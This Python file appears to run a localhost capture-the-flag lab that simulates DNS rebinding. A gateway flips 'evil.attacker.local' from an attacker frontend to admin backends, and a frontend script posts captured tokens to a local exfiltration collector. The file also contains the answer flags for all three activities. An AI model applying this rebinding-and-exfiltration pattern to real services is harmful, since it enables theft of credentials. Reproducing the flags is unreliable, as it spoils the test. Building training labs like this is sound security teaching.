#!/usr/bin/env python3
import json
import os
import signal
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, Optional

STATE_FILE = "/tmp/labf_state.json"
EXFIL_LOG = "/tmp/labf_exfil.log"
PROXY_LOG = "/tmp/labf_proxy.log"
PID_FILE = "/tmp/labf_runtime.pid"

SERVICES = {
    "frontend": 8080,
    "gateway": 8081,
    "admin_a": 8082,
    "proxy": 8083,
    "exfil": 8084,
    "control": 8085,
    "admin_b": 8086,
}

FLAG_BY_ACTIVITY = {
    "1": "IITB{labf_v2_a1_manual_rebind_origin}",
    "2": "IITB{labf_v2_a2_delayed_flip_exfil}",
    "3": "IITB{labf_v2_a3_debug_header_hunt}",
}


def _safe_write(path: str, text: str) -> None:
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(text)


def _append(path: str, text: str) -> None:
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(text)


def activity_from_env() -> str:
    value = os.environ.get("LABF_ACTIVITY", "1").strip()
    return value if value in {"1", "2", "3"} else "1"


def default_state(activity: str) -> dict:
    mode = "manual"
    if activity == "2":
        mode = "delayed"
    if activity == "3":
        mode = "hardened"
    return {
        "activity": activity,
        "mode": mode,
        "mapping": {"evil.attacker.local": "attacker"},
        "armed": False,
        "request_counter": 0,
        "flip_threshold": 3,
        "last_change": int(time.time()),
    }


def load_state() -> dict:
    if not os.path.exists(STATE_FILE):
        state = default_state(activity_from_env())
        save_state(state)
        return state
    with open(STATE_FILE, "r", encoding="utf-8") as handle:
        return json.load(handle)


def save_state(state: dict) -> None:
    state["last_change"] = int(time.time())
    _safe_write(STATE_FILE, json.dumps(state, indent=2, sort_keys=True))


def ensure_files() -> None:
    if not os.path.exists(EXFIL_LOG):
        _safe_write(EXFIL_LOG, "")
    if not os.path.exists(PROXY_LOG):
        _safe_write(PROXY_LOG, "")


def set_plain_headers(handler: BaseHTTPRequestHandler, code: int = 200, extra: Optional[Dict[str, str]] = None) -> None:
    handler.send_response(code)
    handler.send_header("Content-Type", "text/plain; charset=utf-8")
    handler.send_header("Cache-Control", "no-store")
    if extra:
        for key, value in extra.items():
            handler.send_header(key, value)
    handler.end_headers()


def set_json_headers(handler: BaseHTTPRequestHandler, code: int = 200, extra: Optional[Dict[str, str]] = None) -> None:
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json; charset=utf-8")
    handler.send_header("Cache-Control", "no-store")
    if extra:
        for key, value in extra.items():
            handler.send_header(key, value)
    handler.end_headers()


def read_log(path: str) -> str:
    if not os.path.exists(path):
        return ""
    with open(path, "r", encoding="utf-8") as handle:
        return handle.read()


def resolve_target(state: dict, host: str) -> str:
    target = state.get("mapping", {}).get(host, "attacker")
    mode = state.get("mode", "manual")

    if mode == "delayed" and state.get("armed"):
        state["request_counter"] = int(state.get("request_counter", 0)) + 1
        save_state(state)
        if state["request_counter"] >= int(state.get("flip_threshold", 3)):
            state.setdefault("mapping", {})[host] = "admin-a"
            state["armed"] = False
            target = "admin-a"
            save_state(state)

    return target


def target_url_for_path(target: str, path: str) -> str:
    if target == "admin-a":
        return f"http://127.0.0.1:{SERVICES['admin_a']}{path}"
    if target == "admin-b":
        return f"http://127.0.0.1:{SERVICES['admin_b']}{path}"
    return f"http://127.0.0.1:{SERVICES['frontend']}{path}"


def request_backend(url: str, host: str) -> tuple[int, dict, str]:
    req = urllib.request.Request(url=url, method="GET")
    req.add_header("Host", host)
    req.add_header("X-LabF-Victim", "browser")
    try:
        with urllib.request.urlopen(req, timeout=3) as response:
            body = response.read().decode("utf-8", errors="replace")
            headers = dict(response.getheaders())
            return int(response.status), headers, body
    except urllib.error.HTTPError as error:
        body = error.read().decode("utf-8", errors="replace")
        headers = dict(error.headers.items())
        return int(error.code), headers, body


def write_proxy_event(host: str, path: str, target: str, code: int) -> None:
    stamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    _append(PROXY_LOG, f"{stamp} host={host} path={path} routed={target} status={code}\n")


class FrontendHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        return

    def do_GET(self) -> None:
        if self.path == "/" or self.path.startswith("/index"):
            html = """<!doctype html>
<html>
<head>
<meta charset='utf-8'>
<title>LAB-F Browser Console</title>
<style>
body { font-family: ui-monospace, Menlo, monospace; margin: 24px; background: #0f172a; color: #e2e8f0; }
.panel { border: 1px solid #334155; padding: 16px; margin-bottom: 16px; border-radius: 10px; background: #111827; }
button { margin-right: 10px; margin-top: 8px; }
pre { background: #020617; padding: 12px; border-radius: 8px; overflow-x: auto; }
code { color: #38bdf8; }
</style>
</head>
<body>
<h2>LAB - F Runtime Console</h2>
<div class='panel'>
<p>This page models a browser session hitting <code>evil.attacker.local</code> while backend routing changes.</p>
<button onclick='callAdmin()'>Probe /admin via gateway</button>
<button onclick='callHealthz()'>Probe /healthz via gateway</button>
<button onclick='sendExfil()'>Exfiltrate detected token</button>
</div>
<div class='panel'>
<strong>Result</strong>
<pre id='out'>No request yet.</pre>
</div>
<script>
let lastBlob = '';
async function fetchGateway(path) {
  const u = `http://127.0.0.1:8081/fetch?host=${encodeURIComponent('evil.attacker.local')}&path=${encodeURIComponent(path)}`;
  const r = await fetch(u);
  const j = await r.json();
  lastBlob = JSON.stringify(j, null, 2);
  document.getElementById('out').textContent = lastBlob;
}
function callAdmin() { fetchGateway('/admin'); }
function callHealthz() { fetchGateway('/healthz'); }
async function sendExfil() {
  const m = lastBlob.match(/IITB\{[^}]+\}/);
  const token = m ? m[0] : '';
  const resp = await fetch('http://127.0.0.1:8084/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `token=${encodeURIComponent(token)}&source=frontend`
  });
  document.getElementById('out').textContent += `\n\nExfil status: ${resp.status}`;
}
</script>
</body>
</html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html.encode("utf-8"))
            return

        if self.path == "/admin":
            set_plain_headers(self, 404)
            self.wfile.write(b"attacker content only; no admin endpoint\n")
            return

        if self.path == "/healthz":
            set_plain_headers(self, 200)
            self.wfile.write(b"frontend alive\n")
            return

        set_plain_headers(self, 404)
        self.wfile.write(b"not found\n")


class AdminAHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        return

    def do_GET(self) -> None:
        state = load_state()
        flag = FLAG_BY_ACTIVITY.get(state.get("activity", "1"), FLAG_BY_ACTIVITY["1"])
        if self.path == "/admin":
            set_plain_headers(self, 200)
            self.wfile.write(f"admin-a token: {flag}\n".encode("utf-8"))
            return
        if self.path == "/healthz":
            set_plain_headers(self, 200)
            self.wfile.write(b"admin-a healthy\n")
            return
        set_plain_headers(self, 404)
        self.wfile.write(b"not found\n")


class AdminBHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        return

    def do_GET(self) -> None:
        state = load_state()
        flag = FLAG_BY_ACTIVITY.get(state.get("activity", "3"), FLAG_BY_ACTIVITY["3"])
        if self.path == "/admin":
            set_plain_headers(self, 403)
            self.wfile.write(b"blocked by policy\n")
            return
        if self.path == "/healthz":
            set_plain_headers(self, 200, {"X-Debug-Token": flag})
            self.wfile.write(b"admin-b healthy\n")
            return
        set_plain_headers(self, 404)
        self.wfile.write(b"not found\n")


class GatewayHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        return

    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path != "/fetch":
            set_json_headers(self, 404)
            self.wfile.write(json.dumps({"error": "not found"}).encode("utf-8"))
            return

        query = urllib.parse.parse_qs(parsed.query)
        host = query.get("host", ["evil.attacker.local"])[0]
        target_path = query.get("path", ["/"])[0]
        if not target_path.startswith("/"):
            target_path = "/" + target_path

        state = load_state()
        target = resolve_target(state, host)
        backend_url = target_url_for_path(target, target_path)
        code, headers, body = request_backend(backend_url, host)

        write_proxy_event(host, target_path, target, code)

        payload = {
            "host": host,
            "path": target_path,
            "routed_target": target,
            "status": code,
            "headers": headers,
            "body": body,
            "state": {
                "mode": state.get("mode"),
                "armed": state.get("armed"),
                "request_counter": state.get("request_counter"),
                "flip_threshold": state.get("flip_threshold"),
            },
        }
        set_json_headers(self, 200)
        self.wfile.write(json.dumps(payload, indent=2).encode("utf-8"))


class ExfilHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        return

    def do_POST(self) -> None:
        if self.path != "/collect":
            set_plain_headers(self, 404)
            self.wfile.write(b"not found\n")
            return
        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length).decode("utf-8", errors="replace")
        form = urllib.parse.parse_qs(raw)
        token = form.get("token", [""])[0]
        source = form.get("source", ["unknown"])[0]
        stamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        _append(EXFIL_LOG, f"{stamp} source={source} token={token}\n")
        set_plain_headers(self, 200)
        self.wfile.write(b"ok\n")

    def do_GET(self) -> None:
        if self.path != "/logs":
            set_plain_headers(self, 404)
            self.wfile.write(b"not found\n")
            return
        set_plain_headers(self, 200)
        self.wfile.write(read_log(EXFIL_LOG).encode("utf-8"))


class ProxyLogHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        return

    def do_GET(self) -> None:
        if self.path != "/logs":
            set_plain_headers(self, 404)
            self.wfile.write(b"not found\n")
            return
        set_plain_headers(self, 200)
        self.wfile.write(read_log(PROXY_LOG).encode("utf-8"))


class ControlHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        return

    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        state = load_state()

        if parsed.path == "/status":
            set_json_headers(self, 200)
            self.wfile.write(json.dumps(state, indent=2).encode("utf-8"))
            return

        if parsed.path == "/set":
            host = query.get("host", ["evil.attacker.local"])[0]
            target = query.get("target", ["attacker"])[0]
            if target not in {"attacker", "admin-a", "admin-b"}:
                set_json_headers(self, 400)
                self.wfile.write(json.dumps({"error": "invalid target"}).encode("utf-8"))
                return
            state.setdefault("mapping", {})[host] = target
            save_state(state)
            set_json_headers(self, 200)
            self.wfile.write(json.dumps({"ok": True, "mapping": state["mapping"]}).encode("utf-8"))
            return

        if parsed.path == "/arm":
            threshold = int(query.get("threshold", ["3"])[0])
            state["armed"] = True
            state["request_counter"] = 0
            state["flip_threshold"] = max(1, threshold)
            save_state(state)
            set_json_headers(self, 200)
            self.wfile.write(json.dumps({"ok": True, "armed": True, "flip_threshold": state["flip_threshold"]}).encode("utf-8"))
            return

        if parsed.path == "/reset":
            fresh = default_state(state.get("activity", "1"))
            save_state(fresh)
            _safe_write(EXFIL_LOG, "")
            _safe_write(PROXY_LOG, "")
            set_json_headers(self, 200)
            self.wfile.write(json.dumps({"ok": True, "reset": True}).encode("utf-8"))
            return

        if parsed.path == "/clear-logs":
            _safe_write(EXFIL_LOG, "")
            _safe_write(PROXY_LOG, "")
            set_json_headers(self, 200)
            self.wfile.write(json.dumps({"ok": True, "logs_cleared": True}).encode("utf-8"))
            return

        set_json_headers(self, 404)
        self.wfile.write(json.dumps({"error": "not found"}).encode("utf-8"))


def run_servers() -> None:
    ensure_files()
    load_state()

    servers = [
        ThreadingHTTPServer(("127.0.0.1", SERVICES["frontend"]), FrontendHandler),
        ThreadingHTTPServer(("127.0.0.1", SERVICES["gateway"]), GatewayHandler),
        ThreadingHTTPServer(("127.0.0.1", SERVICES["admin_a"]), AdminAHandler),
        ThreadingHTTPServer(("127.0.0.1", SERVICES["proxy"]), ProxyLogHandler),
        ThreadingHTTPServer(("127.0.0.1", SERVICES["exfil"]), ExfilHandler),
        ThreadingHTTPServer(("127.0.0.1", SERVICES["control"]), ControlHandler),
        ThreadingHTTPServer(("127.0.0.1", SERVICES["admin_b"]), AdminBHandler),
    ]

    for server in servers:
        threading.Thread(target=server.serve_forever, daemon=True).start()

    _safe_write(PID_FILE, str(os.getpid()))

    def _shutdown(*_args):
        for server in servers:
            server.shutdown()
        for server in servers:
            server.server_close()
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
        sys.exit(0)

    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT, _shutdown)

    while True:
        time.sleep(1)


def start_runtime() -> int:
    if os.path.exists(PID_FILE):
        try:
            pid = int(open(PID_FILE, "r", encoding="utf-8").read().strip())
            os.kill(pid, 0)
            return 0
        except Exception:
            os.remove(PID_FILE)
    process = subprocess.Popen(
        [sys.executable, __file__, "serve"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    for _ in range(20):
        if os.path.exists(PID_FILE):
            return 0
        time.sleep(0.2)
    return 1 if process.poll() is not None else 0


def stop_runtime() -> int:
    if not os.path.exists(PID_FILE):
        return 0
    pid = int(open(PID_FILE, "r", encoding="utf-8").read().strip())
    try:
        os.kill(pid, signal.SIGTERM)
    except ProcessLookupError:
        pass
    if os.path.exists(PID_FILE):
        os.remove(PID_FILE)
    return 0


def reset_runtime() -> int:
    state = default_state(activity_from_env())
    save_state(state)
    _safe_write(EXFIL_LOG, "")
    _safe_write(PROXY_LOG, "")
    return 0


def print_status() -> int:
    state = load_state()
    print(json.dumps(state, indent=2))
    return 0


def main() -> int:
    if len(sys.argv) < 2:
        print("Usage: runtime_stack.py [start|stop|reset|status|serve]")
        return 1

    cmd = sys.argv[1]
    if cmd == "start":
        return start_runtime()
    if cmd == "stop":
        return stop_runtime()
    if cmd == "reset":
        return reset_runtime()
    if cmd == "status":
        return print_status()
    if cmd == "serve":
        run_servers()
        return 0

    print("Usage: runtime_stack.py [start|stop|reset|status|serve]")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
